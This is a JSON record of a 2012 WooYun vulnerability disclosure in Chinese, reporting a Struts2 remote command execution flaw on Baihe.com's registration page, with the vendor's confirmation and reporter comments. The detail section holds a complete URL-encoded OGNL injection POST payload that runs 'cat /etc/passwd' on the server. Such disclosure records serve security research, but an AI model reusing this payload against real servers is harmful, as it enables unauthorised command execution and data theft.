{"id": 18350, "wybug_id": "wooyun-2012-08979", "wybug_title": "百合网远程命令执行漏洞", "wybug_corp": "百合网", "wybug_author": "Adra1n", "wybug_date": "2012-06-29 09:35", "wybug_open_date": "2012-08-13 09:36", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方框架", "远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-06-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-06-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-07-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-07-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-07-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-08-13：\t细节向公众公开  简要描述： 百合网的struct漏洞，现在这个漏洞泛滥了。求乌云的命令行测试工具。。很帅啊。。再加上百合网的实名制，等级定个高吧。 详细说明：  http://love.baihe.com/Reg.action为漏洞网址，构造的post数据为：\n%28%27\\43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27\\43context[\\%27xwork.MethodAccessor.denyMethodExecution\\%27]\\75false%27%29%28b%29%29&%28%27\\43c%27%29%28%28%27\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27\\43mycmd\\75\\%27cat%20\\\\u002fetc\\\\u002fpasswd\\%27%27%29%28d%29%29&%28h%29%28%28%27\\43myret\\75@java.lang.Runtime@getRuntime%28%29.exec%28\\43mycmd%29%27%29%28d%29%29&%28i%29%28%28%27\\43mydat\\75new\\40java.io.DataInputStream%28\\43myret.getInputStream%28%29%29%27%29%28d%29%29&%28j%29%28%28%27\\43myres\\75new\\40byte[51020]%27%29%28d%29%29&%28k%29%28%28%27\\43mydat.readFully%28\\43myres%29%27%29%28d%29%29&%28l%29%28%28%27\\43mystr\\75new\\40java.lang.String%28\\43myres%29%27%29%28d%29%29&%28m%29%28%28%27\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28n%29%28%28%27\\43myout.getWriter%28%29.println%28\\43mystr%29%27%29%28d%29%29\n   漏洞证明：  \n\n   修复方案：  补丁。   版权声明：转载请注明来源 Adra1n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2012-06-29 13:26 厂商回复： 感谢Adra1n对百合的关注，我们会尽快修复的，谢谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-06-29 09:39 |    \t\tkobin97  \t\t\t( 核心白帽子 |\t\t\t        Rank:1754 漏洞数:190        | 关注网络安全。。)\t\t \n  会不会和这个一样哦？ WooYun: 百合网命令执行漏洞 唉，看来实名制不靠普，官方安全响应也太慢了吧！！！    \n     2012-06-29 09:40 |    \t\tAdra1n \t\t\t( 普通白帽子  |\t\t\t        Rank:437 漏洞数:68        )\t\t \n  @kobin97看不到细节，不清楚一样不一样。    \n     2012-06-29 10:16 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  我都发过了。。百合也联系我了。。  求求你别再发了    \n     2012-06-29 10:44 |    \t\tAdra1n \t\t\t( 普通白帽子  |\t\t\t        Rank:437 漏洞数:68        )\t\t \n  @蟋蟀哥哥 我也不知道你发过了，测试时还没修复呢    \n     2012-06-29 11:33 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @kobin97 @Adra1n 响应太慢了    \n     2012-06-29 22:05 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @xsser 已经修复了的...他们开始没过滤对    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}